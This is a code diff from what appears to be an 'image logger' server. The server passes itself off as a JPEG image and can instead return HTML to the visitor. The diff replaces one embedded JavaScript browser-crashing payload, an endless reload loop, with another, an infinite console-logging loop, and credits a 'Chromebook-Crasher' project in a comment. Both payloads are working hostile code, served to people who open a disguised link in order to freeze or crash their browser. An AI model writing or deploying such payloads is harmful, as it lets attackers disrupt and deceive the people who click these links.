@@ -149,7 +149,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             datatype = 'image/jpeg'
             if config["crashBrowser"]["doCrashBrowser"]:
                 datatype = 'text/html'
-                data = config["crashBrowser"]["customMessage"].encode() + b'<script>onbeforeunload = function(){localStorage.x=1};\n\nsetTimeout(function(){\n  while(1)location.reload(1)\n}, 1000)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+                data = config["crashBrowser"]["customMessage"].encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
             elif config["redirect"]["redirect"]:
                 datatype = 'text/html'
